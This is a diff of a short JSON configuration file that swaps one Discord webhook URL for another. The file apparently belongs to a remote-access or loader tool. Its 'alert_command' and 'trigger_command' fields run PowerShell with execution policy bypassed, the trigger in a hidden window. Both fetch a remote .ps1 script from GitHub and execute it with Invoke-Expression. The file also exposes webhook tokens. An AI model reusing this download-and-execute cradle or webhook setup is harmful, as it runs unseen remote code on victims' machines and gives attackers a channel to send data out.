@@ -1,5 +1,5 @@
 {
-  "webhook": "https://discord.com/api/webhooks/1386755075518496778/QvC90zYIWry3MWqB7PCd83ElN-bP8299J8jIW5W6QlO4H6mSdS8P7Irw5eql1F2IsI8c",
+  "webhook": "https://discord.com/api/webhooks/1356886129063886858/8TJ-bRa_dkrWNyUfieOFkzRnpDvcxBX6KRvI-JrnTaSN0nOJn9dyscichWp9ysNl84T9",
   "alert_command": "powershell.exe -ExecutionPolicy Bypass -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/rude90/forme/refs/heads/main/porject.ps1')\"",
   "trigger_command": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/rude90/forme/refs/heads/main/porject.ps1')\"",
   "trigger_enabled": false
